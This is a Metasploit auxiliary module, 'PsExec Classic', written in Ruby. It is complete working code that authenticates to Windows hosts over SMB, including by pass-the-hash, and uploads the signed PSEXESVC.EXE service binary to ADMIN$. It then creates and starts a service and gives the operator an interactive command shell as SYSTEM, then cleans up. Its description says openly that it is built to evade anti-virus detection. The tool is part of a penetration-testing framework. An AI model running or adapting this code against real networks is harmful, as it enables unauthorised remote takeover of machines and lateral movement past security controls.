##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex/proto/smb/constants'
require 'rex/proto/smb/exceptions'
require 'msf/core/exploit/smb/psexec_svc'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB
  include Msf::Exploit::Remote::SMB::Authenticated
  include Msf::Exploit::Remote::SMB::PsexecSvc

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'PsExec Classic',
      'Description'    => %q{
          This module mimics the classic PsExec tool from Microsoft SysInternals. Anti-virus software has recently rendered the commonly-used exploit/windows/smb/psexec module much less useful
          because the uploaded executable stub is usually detected and deleted before it can be used.  This module sends the same code to the target as the authentic PsExec
          (which happens to have a digital signature from Microsoft), thus anti-virus software cannot distinguish the difference.  AV cannot block it without also blocking the authentic version.
          Of course, this module also supports pass-the-hash, which the authentic PsExec does not.  You must provide a local path to the authentic PsExec.exe (via the PSEXEC_PATH option)
          so that the PSEXESVC.EXE service code can be extracted and uploaded to the target.  The specified command (via the COMMAND option) will be executed with SYSTEM privileges.
      },
      'Author'         =>
        [
          'Joe Testa <jtesta[at]positronsecurity.com>',
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx' ]
        ],
      'Platform'       => 'win',
    ))

    register_options(
      [
        OptString.new('PSEXEC_PATH', [ true, "The local path to the authentic PsExec.exe", '' ]),
        OptString.new('COMMAND', [ true, "The program to execute with SYSTEM privileges.", 'cmd.exe' ])
      ], self.class )
  end

  def run()
    psexec_path = datastore['PSEXEC_PATH']
    command = datastore['COMMAND']

    psexesvc = extract_psexesvc(psexec_path, true)

    print_status("Connecting to #{datastore['RHOST']}...")
    if not connect
      print_error("Failed to connect.")
      return false
    end

    print_status("Authenticating to #{smbhost} as user '#{splitname(datastore['SMBUser'])}'...")
    smb_login

    if (not simple.client.auth_user)
      print_error("Server granted only Guest privileges.")
      disconnect
      return false
    end


    print_status('Uploading PSEXESVC.EXE...')
    simple.connect("\\\\#{datastore['RHOST']}\\ADMIN\$")

    # Attempt to upload PSEXESVC.EXE into the ADMIN$ share.  If this
    # fails, attempt to continue since it might already exist from
    # a previous run.
    begin
      fd = smb_open('\\PSEXESVC.EXE', 'rwct')
      fd << psexesvc
      fd.close
      print_status('Created \PSEXESVC.EXE in ADMIN$ share.')
    rescue Rex::Proto::SMB::Exceptions::ErrorCode => e
      # 0xC0000043 = STATUS_SHARING_VIOLATION, which in this
      # case means that the file was already there from a
      # previous invocation...
      if e.error_code == 0xC0000043
        print_error('Failed to upload PSEXESVC.EXE into ADMIN$ share because it already exists.  Attepting to continue...')
      else
        print_error('Error ' + e.get_error(e.error_code) + ' while uploading PSEXESVC.EXE into ADMIN$ share.  Attempting to continue...')
      end
    end
    psexesvc = nil

    simple.disconnect("\\\\#{datastore['RHOST']}\\ADMIN\$")

    print_status('Connecting to IPC$...')
    simple.connect("\\\\#{datastore['RHOST']}\\IPC\$")
    handle = dcerpc_handle('367abb81-9844-35f1-ad32-98f038001003', '2.0', 'ncacn_np', ["\\svcctl"])
    print_status("Binding to DCERPC handle #{handle}...")
    dcerpc_bind(handle)
    print_status("Successfully bound to #{handle} ...")


    begin
      # Get a handle to the service control manager.
      print_status('Obtaining a service control manager handle...')
      scm_handle = dce_openscmanagerw(dcerpc, datastore['RHOST'])
      if scm_handle == nil
        print_error('Failed to obtain handle to service control manager.')
        return
      end

      # Create the service.
      print_status('Creating a new service (PSEXECSVC - "PsExec")...')
      begin
        svc_handle = dce_createservicew(dcerpc,
          scm_handle,
          'PSEXESVC',  # Service name
          'PsExec',    # Display name
          '%SystemRoot%\PSEXESVC.EXE', # Binary path
          {:type => 0x00000010}) # Type: Own process
        if svc_handle == nil
          print_error('Error while creating new service.')
          return
        end

        # Close the handle to the service.
        if not dce_closehandle(dcerpc, svc_handle)
          print_error('Failed to close service handle.')
          # If this fails, we can still continue...
        end

      rescue ::Exception => e
        # An exception can occur if the service already exists due to a prior unclean shutdown.  We can try to
        # continue anyway.
      end

      # Re-open the service.  In case we failed to create the service because it already exists from a previous invokation,
      # this will obtain a handle to it regardless.
      print_status('Opening service...')
      svc_handle = dce_openservicew(dcerpc, scm_handle, 'PSEXESVC')
      if svc_handle == nil
        print_error('Failed to open service.')
        return
      end

      # Start the service.
      print_status('Starting the service...')
      if not dce_startservice(dcerpc, svc_handle)
        print_error('Failed to start the service.')
        return
      end

    rescue ::Exception => e
      print_error("Error: #{e}\n#{e.backtrace.join("\n")}")
      return
    end


    print_status("Connecting to \\psexecsvc pipe...")
    psexecsvc_proc = simple.create_pipe('\psexecsvc')

    # For some reason, the service needs to be pinged first to
    # wake it up...
    magic = simple.trans_pipe(psexecsvc_proc.file_id, NDR.long(0xBE))

    # Make up a random hostname and local PID to send to the
    # service.  It will create named pipes for stdin/out/err based
    # on these.
    random_hostname = Rex::Text.rand_text_alpha(12)
    random_client_pid_low = rand(255)
    random_client_pid_high = rand(255)
    random_client_pid = (random_client_pid_low + (random_client_pid_high * 256)).to_s

    print_status("Instructing service to execute #{command}...")
    smbclient = simple.client

    # The standard client.write() method doesn't work since the
    # service is expecting certain packet flags to be set.  Hence,
    # we need to use client.write_raw() and specify everything
    # ourselves (such as Unicode strings, AndXOffsets, and data
    # offsets).

    # In the first message, we tell the service our made-up
    # hostname and PID, and tell it what program to execute.
    smbclient.write_raw(psexecsvc_proc.file_id, 0x18, 0xc807, 14,
      255, 0, 0, 0x000c, 19032, 0, 4292, 64, 0, 4293,
      "\xee\x58\x4a\x58\x4a\x00\x00" <<
      random_client_pid_low.chr <<
      random_client_pid_high.chr << "\x00\x00" <<
      Rex::Text.to_unicode(random_hostname) <<
      ("\x00" * 496) << Rex::Text.to_unicode(command) <<
      ("\x00" * (3762 - (command.length * 2))), true)

    # In the next three messages, we just send lots of zero bytes...
    smbclient.write_raw(psexecsvc_proc.file_id, 0x18, 0xc807, 14, 255, 57054, 4290, 0x0004, 19032, 0, 4290, 64, 0, 4291, "\xee" << ("\x00" * 4290), true)

    smbclient.write_raw(psexecsvc_proc.file_id, 0x18, 0xc807, 14, 255, 57054, 8580, 0x0004, 19032, 0, 4290, 64, 0, 4291, "\xee" << ("\x00" * 4290), true)

    smbclient.write_raw(psexecsvc_proc.file_id, 0x18, 0xc807, 14, 255, 57054, 12870, 0x0004, 19032, 0, 4290, 64, 0, 4291, "\xee" << ("\x00" * 4290), true)

    # In the final message, we give it some magic bytes.  This
    # (somehow) corresponds to the "-s" flag in PsExec.exe, which
    # tells it to execute the specified command as SYSTEM.
    smbclient.write_raw(psexecsvc_proc.file_id, 0x18, 0xc807, 14,
      255, 57054, 17160, 0x0004, 19032, 0, 1872, 64, 0, 1873,
      "\xee" << ("\x00" * 793) << "\x01" << ("\x00" * 14) <<
      "\xff\xff\xff\xff" << ("\x00" * 1048) << "\x01" <<
      ("\x00" * 11), true)


    # Connect to the named pipes that correspond to stdin, stdout,
    # and stderr.
    psexecsvc_proc_stdin = connect_to_pipe("\psexecsvc-#{random_hostname}-#{random_client_pid}-stdin")
    psexecsvc_proc_stdout = connect_to_pipe("\psexecsvc-#{random_hostname}-#{random_client_pid}-stdout")
    psexecsvc_proc_stderr = connect_to_pipe("\psexecsvc-#{random_hostname}-#{random_client_pid}-stderr")


    # Read from stdout and stderr.  We need to record the multiplex
    # IDs so that when we get a response, we know which it belongs
    # to.  Trial & error showed that the service DOES NOT like it
    # when you repeatedly try to read from a pipe when it hasn't
    # returned from the last call.  Hence, we use these IDs to know
    # when to call read again.
    stdout_multiplex_id = smbclient.multiplex_id
    smbclient.read(psexecsvc_proc_stdout.file_id, 0, 1024, false)

    stderr_multiplex_id = smbclient.multiplex_id
    smbclient.read(psexecsvc_proc_stderr.file_id, 0, 1024, false)

    # Loop to read responses from the server and process commands
    # from the user.
    socket = smbclient.socket
    rds = [socket, $stdin]
    wds = []
    eds = []
    last_char = nil

    begin
      while true
        r,w,e = ::IO.select(rds, wds, eds, 1.0)

        # If we have data from the socket to read...
        if (r != nil) and (r.include? socket)

          # Read the SMB packet.
          data = smbclient.smb_recv
          smbpacket = Rex::Proto::SMB::Constants::SMB_BASE_PKT.make_struct
          smbpacket.from_s(data)

          # If this is a response to our read
          # command...
          if smbpacket['Payload']['SMB'].v['Command'] == Rex::Proto::SMB::Constants::SMB_COM_READ_ANDX
            parsed_smbpacket = smbclient.smb_parse_read(smbpacket, data)

            # Check to see if this is a STATUS_PIPE_DISCONNECTED
            # (0xc00000b0) message, which tells us that the remote program
            # has terminated.
            if parsed_smbpacket['Payload']['SMB'].v['ErrorClass'] == 0xc00000b0
              print_status "Received STATUS_PIPE_DISCONNECTED.  Terminating..."
              # Read in another SMB packet, since program termination
              # causes both the stdout and stderr pipes to issue a
              # disconnect message.
              smbclient.smb_recv rescue nil

              # Break out of the while loop so we can clean up.
              break
            end

            # Print the data from our read request.
            print parsed_smbpacket['Payload'].v['Payload']

            # Check the multiplex ID from this read response, and see
            # which pipe it came from (stdout or stderr?).  Issue another
            # read request on that pipe.
            received_multiplex_id = parsed_smbpacket['Payload']['SMB'].v['MultiplexID']
            if received_multiplex_id == stdout_multiplex_id
              stdout_multiplex_id = smbclient.multiplex_id
              smbclient.read(psexecsvc_proc_stdout.file_id, 0, 1024, false)
            elsif received_multiplex_id == stderr_multiplex_id
              stderr_multiplex_id = smbclient.multiplex_id
              smbclient.read(psexecsvc_proc_stderr.file_id, 0, 1024, false)
            end
          end
        end

        # If the user entered some input.
        if (r != nil) and (r.include? $stdin)

          # There's actually an entire line of text available, but the
          # standard PsExec.exe client sends one byte at a time, so we'll
          # duplicate this behavior.
          data = $stdin.read_nonblock(1)

          # The remote program expects CRLF line endings, but in Linux, we
          # only get LF line endings...
          if data == "\x0a" and last_char != "\x0d"
            smbclient.write_raw(psexecsvc_proc_stdin.file_id, 0x18, 0xc807, 14, 255, 57054, 0, 0x0008, 1, 0, 1, 64, 0, 2, "\xee\x0d", true)
          end

          smbclient.write_raw(psexecsvc_proc_stdin.file_id, 0x18, 0xc807, 14, 255, 57054, 0, 0x0008, 1, 0, 1, 64, 0, 2, "\xee" << data, true)
          last_char = data
        end
      end
    rescue ::Exception => e
      print_error("Error: #{e}")
      print_status('Attempting to terminate gracefully...')
    end


    # Time to clean up.  Close the handles to stdin, stdout,
    # stderr, as well as the handle to the \psexecsvc pipe.
    smbclient.close(psexecsvc_proc_stdin.file_id) rescue nil
    smbclient.close(psexecsvc_proc_stdout.file_id) rescue nil
    smbclient.close(psexecsvc_proc_stderr.file_id) rescue nil
    smbclient.close(psexecsvc_proc.file_id) rescue nil

    # Stop the service.
    begin
      print_status('Stopping the service...')
      if not dce_stopservice(dcerpc, svc_handle)
        print_error('Error while stopping the service.')
        # We will try to continue anyway...
      end
    rescue ::Exception => e
      print_error("Error: #{e}\n#{e.backtrace.join("\n")}")
    end

    # Wait a little bit for it to stop before we delete the service.
    if wait_for_service_to_stop(svc_handle) == false
      print_error('Could not stop the PSEXECSVC service.  Attempting to continue cleanup...')
    end

    # Delete the service.
    begin
      print_status("Removing the service...")
      if not dce_deleteservice(dcerpc, svc_handle)
        print_error('Error while deleting the service.')
        # We will try to continue anyway...
      end

      print_status("Closing service handle...")
      if not dce_closehandle(dcerpc, svc_handle)
        print_error('Error while closing the service handle.')
        # We will try to continue anyway...
      end
    rescue ::Exception => e
      print_error("Error: #{e}\n#{e.backtrace.join("\n")}")
    end


    # Disconnect from the IPC$ share.
    print_status("Disconnecting from \\\\#{datastore['RHOST']}\\IPC\$")
    simple.disconnect("\\\\#{datastore['RHOST']}\\IPC\$")

    # Connect to the ADMIN$ share so we can delete PSEXECSVC.EXE.
    print_status("Connecting to \\\\#{datastore['RHOST']}\\ADMIN\$")
    simple.connect("\\\\#{datastore['RHOST']}\\ADMIN\$")

    print_status('Deleting \\PSEXESVC.EXE...')
    simple.delete('\\PSEXESVC.EXE')

    # Disconnect from the ADMIN$ share.  Now we're done!
    print_status("Disconnecting from \\\\#{datastore['RHOST']}\\ADMIN\$")
    simple.disconnect("\\\\#{datastore['RHOST']}\\ADMIN\$")

  end

  # Connects to the specified named pipe.  If it cannot be done, up
  # to three retries are made.
  def connect_to_pipe(pipe_name)
    retries = 0
    pipe_fd = nil
    while (retries < 3) and (pipe_fd == nil)
      # On the first retry, wait one second, on the second
      # retry, wait two...
      select(nil, nil, nil, retries)

      begin
        pipe_fd = simple.create_pipe(pipe_name)
      rescue
        retries += 1
      end
    end

    if pipe_fd != nil
      print_status("Connected to named pipe #{pipe_name}.")
    else
      print_error("Failed to connect to #{pipe_name}!")
    end

    return pipe_fd
  end

  # Query the service and wait until its stopped.  Wait one second
  # before the first retry, two seconds before the second retry,
  # and three seconds before the last attempt.
  def wait_for_service_to_stop(svc_handle)
    service_stopped = false
    retries = 0
    while (retries < 3) and (service_stopped == false)
      select(nil, nil, nil, retries)

      if dce_queryservice(dcerpc, svc_handle) == 2
        service_stopped = true
      else
        retries += 1
      end
    end
    return service_stopped
  end
end
